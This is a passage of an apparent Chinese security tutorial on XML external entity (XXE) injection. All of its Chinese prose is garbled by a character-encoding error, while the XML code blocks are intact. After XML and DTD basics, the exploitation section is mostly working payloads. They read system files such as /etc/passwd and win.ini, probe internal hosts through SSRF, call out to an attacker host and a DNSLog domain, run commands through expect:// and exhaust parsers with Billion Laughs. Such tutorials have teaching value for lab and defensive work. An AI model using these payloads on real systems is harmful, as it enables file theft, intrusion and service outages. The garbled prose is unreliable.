‡ç­¾å’Œæ–‡æ¡£ç»“æ„ï¼Œæ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚</p><p><strong>è¯­æ³•è§„å¾‹ï¼š</strong></p><ul><li>åŒºåˆ†å¤§å°å†™ï¼ŒåŒæ—¶æ¯ä¸ªæ ‡ç­¾éœ€è¦é—­åˆï¼ˆåœ¨burpé‡Œé¢postæ„é€ xmlçš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è§„èŒƒæ ¼å¼çš„ï¼‰</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Maga</span>&gt;</span>é”™è¯¯<span class="tag">&lt;/<span class="name">maga</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maga</span>&gt;</span>é”™è¯¯</span><br><span class="line"><span class="tag">&lt;<span class="name">maga</span>&gt;</span>æ­£ç¡®<span class="tag">&lt;/<span class="name">maga</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>å±æ€§å€¼å¿…é¡»åŠ å¼•å·</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">data</span>=<span class="string">&quot;7/31/2023&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>lan<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>SpongeBob<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>å®ä½“å¼•ç”¨æ—¶ï¼Œé¿å…é”™è¯¯é—­åˆï¼Œå®ä½“åŒ–è½¬æ¢é—®é¢˜ï¼š</li></ul><div class="table-container"><table><thead><tr><th>\&lt;</th><th>&lt;</th></tr></thead><tbody><tr><td>\&gt;</td><td>&gt;</td></tr><tr><td>\&amp;</td><td>&amp;</td></tr><tr><td>\&apos;</td><td>â€˜</td></tr><tr><td>\&quot;</td><td>â€œ</td></tr></tbody></table></div><ul><li>æ³¨é‡Šï¼š<code>&lt;!--å…«å˜--&gt;</code></li></ul><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚</p><p>DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚</p><p><strong>å†…éƒ¨çš„ DOCTYPE å£°æ˜</strong></p><p>å‡å¦‚ DTD è¢«åŒ…å«åœ¨æ‚¨çš„ XML æºæ–‡ä»¶ä¸­ï¼Œå®ƒåº”å½“é€šè¿‡ä¸‹é¢çš„è¯­æ³•åŒ…è£…åœ¨ä¸€ä¸ª DOCTYPE å£°æ˜ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</span><br></pre></td></tr></table></figure><p><strong>å¤–éƒ¨æ–‡æ¡£å£°æ˜</strong></p><p>å‡å¦‚ DTD ä½äº XML æºæ–‡ä»¶çš„å¤–éƒ¨ï¼Œé‚£ä¹ˆå®ƒåº”é€šè¿‡ä¸‹é¢çš„è¯­æ³•è¢«å°è£…åœ¨ä¸€ä¸ª DOCTYPE å®šä¹‰ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>DTDçš„ä½œç”¨ï¼š</strong></p><ul><li>é€šè¿‡ DTDï¼Œæ¯ä¸€ä¸ª XML æ–‡ä»¶å‡å¯æºå¸¦ä¸€ä¸ªæœ‰å…³å…¶è‡ªèº«æ ¼å¼çš„æè¿°ã€‚</li><li>é€šè¿‡ DTDï¼Œç‹¬ç«‹çš„å›¢ä½“å¯ä¸€è‡´åœ°ä½¿ç”¨æŸä¸ªæ ‡å‡†çš„ DTD æ¥äº¤æ¢æ•°æ®ã€‚</li><li>åº”ç”¨ç¨‹åºä¹Ÿå¯ä½¿ç”¨æŸä¸ªæ ‡å‡†çš„ DTD æ¥éªŒè¯ä»å¤–éƒ¨æ¥æ”¶åˆ°çš„æ•°æ®ã€‚</li><li>è¿˜å¯ä»¥ä½¿ç”¨ DTD æ¥éªŒè¯è‡ªèº«çš„æ•°æ®ã€‚</li></ul><h1 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h1><p>å®ä½“å¯ä»¥ç†è§£ä¸ºå˜é‡ï¼Œå…¶å¿…é¡»åœ¨DTDä¸­å®šä¹‰ç”³æ˜ï¼Œå¯ä»¥åœ¨æ–‡æ¡£ä¸­çš„å…¶ä»–ä½ç½®å¼•ç”¨è¯¥å˜é‡çš„å€¼ã€‚</p><p><strong>å®ä½“ç±»åˆ«</strong></p><p>å®ä½“æŒ‰ç±»å‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å››ç§ï¼š</p><ul><li>å†…ç½®å®ä½“ (Built-in entities)</li><li>å­—ç¬¦å®ä½“ (Character entities)</li><li>é€šç”¨å®ä½“ (General entities)</li><li>å‚æ•°å®ä½“ (Parameter entities)</li></ul><p>ä½†é€šä¿—çš„åˆ†ä¸ºï¼šå‚æ•°å®ä½“å’Œå…¶ä½™å®ä½“</p><blockquote><p>å‚æ•°å®ä½“ç”¨%å®ä½“åç§°ç”³æ˜ï¼Œå¼•ç”¨æ—¶ä¹Ÿç”¨%å®ä½“åç§°;å…¶ä½™å®ä½“ç›´æ¥ç”¨å®ä½“åç§°ç”³æ˜ï¼Œå¼•ç”¨æ—¶ç”¨&amp;å®ä½“åç§°ã€‚<br>å‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼ŒDTDä¸­å¼•ç”¨ï¼›å…¶ä½™å®ä½“åªèƒ½åœ¨DTDä¸­ç”³æ˜ï¼Œå¯åœ¨xmlæ–‡æ¡£ä¸­å¼•ç”¨ã€‚</p></blockquote><ul><li>å†…éƒ¨å®ä½“ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>å¤–éƒ¨å®ä½“ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>å‚æ•°å®ä½“ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;æˆ–è€…&lt;!ENTITY % å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="ç†Ÿæ‚‰ä»£ç ç»“æ„"><a href="#ç†Ÿæ‚‰ä»£ç ç»“æ„" class="headerlink" title="ç†Ÿæ‚‰ä»£ç ç»“æ„"></a>ç†Ÿæ‚‰ä»£ç ç»“æ„</h1><blockquote><p>ç¬¬ä¸€éƒ¨åˆ†ï¼šXMLå£°æ˜éƒ¨åˆ†</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>ç¬¬äºŒéƒ¨åˆ†ï¼šDTDçš„å®šä¹‰</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY name SYSTEM &quot;URI/URL&quot;&gt;æˆ–è€…&lt;!ENTITY name &quot;hello jazz&quot;&gt;(å®ä½“è¦å£°æ˜åœ¨DTDçš„é‡Œé¢)</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure><blockquote><p>ç¬¬ä¸‰éƒ¨åˆ†ï¼šæ–‡æ¡£å…ƒç´ </p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>SpongeBob<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hack</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">hack</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>pikachu</strong></p><ul><li>éå‚æ•°å†…éƒ¨å®ä½“ï¼š</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="keyword">name</span> <span class="string">&quot;hello SpongeBob&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;name;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>éå‚æ•°å¤–éƒ¨å®ä½“ï¼š</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ENTITY <span class="keyword">hack</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;hack;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>å‚æ•°å†…/å¤–å®ä½“ï¼ˆ%ï¼‰ï¼š</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % å®ä½“åç§° <span class="string">&quot;å®ä½“çš„å€¼&quot;</span>&gt;</span></span><br><span class="line">æˆ–è€…</span><br><span class="line"><span class="meta">&lt;!ENTITY % å®ä½“åç§° <span class="keyword">SYSTEM</span> <span class="string">&quot;URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>å†…éƒ¨DTD+å‚æ•°å¤–éƒ¨å®ä½“ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        %name;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š%nameï¼ˆå‚æ•°å®ä½“ï¼‰æ˜¯åœ¨DTDä¸­è¢«å¼•ç”¨çš„ï¼Œè€Œ&amp;nameï¼ˆå…¶ä½™å®ä½“ï¼‰æ˜¯åœ¨xmlæ–‡æ¡£ä¸­è¢«å¼•ç”¨çš„</strong></p><p>ç”±äºxxeæ¼æ´ä¸»è¦æ˜¯åˆ©ç”¨äº†DTDå¼•ç”¨å¤–éƒ¨å®ä½“å¯¼è‡´çš„æ¼æ´ï¼Œé‚£ä¹ˆé‡ç‚¹çœ‹ä¸‹èƒ½å¼•ç”¨å“ªäº›ç±»å‹çš„å¤–éƒ¨å®ä½“ã€‚</p><p><strong>å¤–éƒ¨å®ä½“</strong></p><p>å¤–éƒ¨å®ä½“å³åœ¨DTDä¸­ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>è¯­æ³•å¼•ç”¨å¤–éƒ¨çš„å®ä½“ï¼Œè€Œéå†…éƒ¨å®ä½“ï¼Œé‚£ä¹ˆURLä¸­èƒ½å†™å“ªäº›ç±»å‹çš„å¤–éƒ¨å®ä½“å‘¢ï¼Ÿ<br>ä¸»è¦çš„æœ‰fileã€httpã€httpsã€ftpç­‰ç­‰ï¼Œå½“ç„¶ä¸åŒçš„ç¨‹åºæ”¯æŒçš„ä¸ä¸€æ ·ï¼š</p><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_02.png" alt=""></p><p>phpå®‰è£…æ‰©å±•åè¿˜èƒ½æ”¯æŒçš„ä¸€äº›åè®®ï¼š</p><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_03.png" alt=""></p><h1 id="XXEæ£€æµ‹"><a href="#XXEæ£€æµ‹" class="headerlink" title="XXEæ£€æµ‹"></a>XXEæ£€æµ‹</h1><p>æ£€æµ‹æ˜¯å¦æœ‰å¤–å¸¦ï¼š</p><ul><li><a href="http://ceye.io/payloads">CEYE</a></li><li><a href="http://dnslog.cn/">DNSLog</a></li></ul><p>ä¸»è¦çš„æ–¹æ³•æ˜¯æ£€æµ‹æ‰€æœ‰æ¥å—XMLä½œä¸ºè¾“å…¥å†…å®¹ç«¯ç‚¹ï¼ŒæŠ“åŒ…è§‚å¯Ÿå…¶æ˜¯å¦ä¼šè¿”å›æˆ‘ä»¬æƒ³è¦çš„å†…å®¹ã€‚</p><ul><li>é¦–å…ˆæ£€æµ‹XMLæ˜¯å¦ä¼šè¢«æˆåŠŸè§£æï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;root&gt;&amp;words;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_04.png" alt=""></p><p>å¦‚æœæ•°æ®åŒ…æˆ–é¡µé¢ä¸­å­˜åœ¨<code>Hello XXE</code>çš„å­—æ ·ï¼Œåˆ™è¡¨åå®ä½“å·²è¢«è§£æã€‚</p><ul><li>æ¥ä¸‹æ¥æ£€æµ‹è¯¥ç«¯ç‚¹æ˜¯å¦æ”¯æŒDTDå¼•ç”¨å¤–éƒ¨å®ä½“ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=â€1.0â€ encoding=â€UTF-8â€?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY name SYSTEM &quot;http://jmdyc7.dnslog.cn&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;xxe&gt;&amp;name;&lt;/xxe&gt;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶é€šè¿‡æŸ¥çœ‹<code>dnslog</code>ç½‘ç«™æŸ¥çœ‹æ˜¯å¦æœ‰è¯·iæ±‚ä¿¡æ¯ï¼š</p><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_05.png" alt=""></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œåˆ™è¯¥å¤„å¾ˆå¯èƒ½å­˜åœ¨XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ã€‚</p><ul><li>é€šè¿‡è§‚å¯Ÿæˆ–ä¿®æ”¹è¯·æ±‚å¤´ä¸­ï¼šContent-Type=&gt;&gt;text/xmlæˆ–Content-type:application/xml</li></ul><p>è®¸å¤šæœåŠ¡ç«¯å¼€å‘æ¡†æ¶(æ¯”å¦‚åŸºäºRESTfulæœåŠ¡çš„JAX-RS)ä¹Ÿå…è®¸åŸºäºæ•°æ®äº¤æ¢çš„XMLæ ¼å¼ä½œä¸ºè¾“å…¥ï¼Œç”šè‡³æ˜¯è¾“å‡ºã€‚å¦‚æœå¯ä»¥è¿›è¡Œè¿™ç§æ›¿æ¢ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹è¯·æ±‚å¤´ä¸­çš„Content-Typeçš„å€¼(æ¯”å¦‚ä¿®æ”¹æˆtext/xmlæˆ–è€…application/xml)æ¥è¿›è¡ŒéªŒè¯è§¦å‘ã€‚å³ä½¿å®¢æˆ·ç«¯åªèƒ½ä½¿ç”¨JSONæ ¼å¼æˆ–è€…æ˜¯ç›´æ¥è·¯å¾„æˆ–è€…æ˜¯å‚æ•°æŸ¥è¯¢çš„æ–¹å¼æ¥è®¿é—®æœåŠ¡ã€‚</p><h1 id="XXEåˆ©ç”¨åŠpayload"><a href="#XXEåˆ©ç”¨åŠpayload" class="headerlink" title="XXEåˆ©ç”¨åŠpayload"></a>XXEåˆ©ç”¨åŠpayload</h1><p>ä»¥ä¸‹åˆ©ç”¨ä¸»è¦åŸºäº<code>libxml2</code>ç‰ˆæœ¬ï¼Œå…¶ä¸­libxmlæ˜¯PHPçš„xmlæ”¯æŒã€‚<br>è€Œlibxmlç‰ˆæœ¬åœ¨2.9.1åŠä»¥åï¼Œé»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œå¾ˆå¤šåˆ©ç”¨å°†æ— æ³•å®ç°ã€‚</p><h2 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h2><p><strong>pikachuæ¼”ç¤ºï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY hack SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;hack;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_06.png" alt=""></p><p>æ–‡ä»¶è¯»å–çš„åˆ©ç”¨å’Œpayloadéå¸¸å¥½ç†è§£ï¼Œå³ä½¿ç”¨fileåè®®è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶è¾“å‡ºåˆ°é¡µé¢ä¸Šï¼ˆæœ‰å›æ˜¾çš„æƒ…å†µï¼‰</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>XXE å¯ä»¥ä¸SSRFï¼ˆæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰ æ¼æ´ä¸€èµ·ç”¨äºæ¢æµ‹å…¶å®ƒå†…ç½‘ä¸»æœºçš„ä¿¡æ¯ï¼ŒåŸºäºhttpåè®®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨æ¥æ¢æµ‹ç«¯å£ä¿¡æ¯ï¼Œæ ¹æ®å“åº”åŒ…çš„ä¿¡æ¯ï¼Œè‹¥é<code>connection refused</code>åˆ™è¡¨ç¤ºè¯¥ç«¯å£å¯èƒ½æ˜¯å¼€æ”¾çš„ã€‚</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œæœ‰äº›ä¼ä¸šå¯¹å†…ç½‘çš„å®‰å…¨æ€§å¯èƒ½ä¸é‚£ä¹ˆæ³¨é‡ã€‚é™¤äº†ä»¥ä¸Šçš„åˆ©ç”¨ï¼Œæ§åˆ¶æœåŠ¡å™¨å¯¹å¤–ç½‘å‘é€è¯·æ±‚ä¹Ÿæ˜¯æœ‰å¯èƒ½æˆåŠŸçš„ã€‚æ­¤å¤„å¯ä½¿ç”¨ncatå·¥å…·è¿›è¡Œæµ‹è¯•ã€‚</p><p>å…³äºncatçš„ä½¿ç”¨ï¼š<a href="https://blog.51cto.com/executer/2074434">ncat-ç½‘ç»œå·¥å…·ä¸­çš„â€˜ç‘å£«å†›åˆ€â€™</a></p><p>ncatåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå¼€å¯ç›‘å¬ï¼šncat -lvkp 9999(ç«¯å£å¯è‡ªå®šä¹‰)</p><p>ä¹‹åä¾¿å¯ä½¿ç”¨ä»¥ä¸‹è¯­å¥å°è¯•æ˜¯å¦èƒ½å¤Ÿå»ºç«‹è¿æ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERIP:9999/&quot; [</span><br><span class="line">    &lt;!ELEMENT data (#PCDATA)&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœèƒ½å¤Ÿå»ºç«‹è¿æ¥ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ç«¯çš„ncatä¼šæ”¶åˆ°ç›¸åº”çš„è¯·æ±‚ä¿¡æ¯ã€‚</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>åœ¨å®‰è£…expectæ‰©å±•çš„PHPç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå½“ç„¶å…¶ä»–åè®®ä¹Ÿæœ‰å¯èƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">    &lt;!ELEMENT name ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;</span><br><span class="line">/root&gt;</span><br></pre></td></tr></table></figure><h2 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h2><p>æ”¯æŒå®ä½“æµ‹è¯•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">    &lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">    &lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœè§£æè¿‡ç¨‹å˜çš„éå¸¸ç¼“æ…¢ï¼Œåˆ™è¡¨æ˜æµ‹è¯•æˆåŠŸï¼Œå³ç›®æ ‡è§£æå™¨é…ç½®ä¸å®‰å…¨å¯èƒ½é­å—è‡³å°‘ä¸€ç§ DDoS æ”»å‡»ã€‚</p><h2 id="Billion-Laughs-æ”»å‡»"><a href="#Billion-Laughs-æ”»å‡»" class="headerlink" title="Billion Laughs æ”»å‡»"></a>Billion Laughs æ”»å‡»</h2><p>ä¸€ä¸ªç»å…¸çš„Dosæ”»å‡»payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">    &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">    ......</span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>å½“XMLè§£æå™¨åŠ è½½è¯¥æ–‡æ¡£æ—¶ï¼Œå®ƒä¼šçœ‹åˆ°å®ƒåŒ…å«ä¸€ä¸ªæ ¹å…ƒç´ â€œlolzâ€ï¼Œè¯¥å…ƒç´ 